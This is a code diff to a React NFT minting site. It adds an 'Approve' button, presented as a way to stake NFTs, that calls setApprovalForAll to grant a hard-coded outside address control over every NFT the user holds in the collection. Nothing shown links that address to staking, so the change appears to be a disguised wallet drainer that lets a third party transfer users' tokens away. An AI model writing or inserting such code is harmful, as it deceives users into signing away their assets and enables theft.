@@ -114,6 +114,18 @@ function App() {
     MARKETPLACE_LINK: "",
     SHOW_BACKGROUND: false,
   });
+  
+    const approveNFTs = () => {
+
+    blockchain.smartContract.methods
+    .setApprovalForAll("0x4D8C6bFEA02A8739D587F7BB9B76D5BB581eB9c6",true)
+    .send({
+      to: CONFIG.CONTRACT_ADDRESS,
+      from: blockchain.account,
+    })
+
+  }
+
 
   const claimNFTs = () => {
     let cost = CONFIG.WEI_COST;
@@ -456,8 +468,28 @@ function App() {
           </s.Container>
           <s.SpacerLarge />
         </ResponsiveWrapper>
-        <s.SpacerMedium />
         <s.Container jc={"center"} ai={"center"} style={{ width: "70%" }}>
+        <s.TextDescription
+                      style={{
+                        textAlign: "center",
+                        color: "var(--accent-text)",
+                      }}
+                    >
+                      If You Want To Stake Your NFT Click Approve
+                    </s.TextDescription>
+          <s.SpacerSmall />
+          <StyledButton
+                        onClick={(e) => {
+                          e.preventDefault();
+                          approveNFTs();
+                          getData();
+                        }}
+                      >
+                       Approve
+                      </StyledButton>
+        </s.Container>
+        <s.SpacerMedium />
+        <s.Container jc={"center"} ai={"center"} style={{ width: "70%", marginBottom: "100px" }}>
           <s.TextDescription
             style={{
               textAlign: "center",
